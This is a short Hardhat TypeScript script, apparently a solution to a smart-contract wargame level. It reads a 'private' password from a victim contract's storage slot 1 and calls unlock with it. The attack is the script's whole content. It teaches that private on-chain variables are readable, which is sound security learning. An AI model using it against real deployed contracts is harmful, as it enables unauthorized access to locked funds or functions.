import { ethers } from "hardhat";

const helper = async (victim: any) => {
  /*
  We know that EVM stores state variables in 256 bit slots,
  packing any adjacent variables that can fit together in the same slot.
  That means we expect Vault's state variables to be stored as such:

  bool public locked;       // Slot 0
  bytes32 private password; // Slot 1
 */
  // We read the second slot
  const hexPassword = await ethers.provider.getStorageAt(victim.address, 1);

  // We convert from hex to UTF-8 encoded string (for confirmation)
  const asciiPassword = ethers.utils.toUtf8String(hexPassword);
  console.log(`Password is: ${asciiPassword}`);

  // Attack
  const tx = await victim.unlock(hexPassword);
  await tx.wait();
};

export default helper;
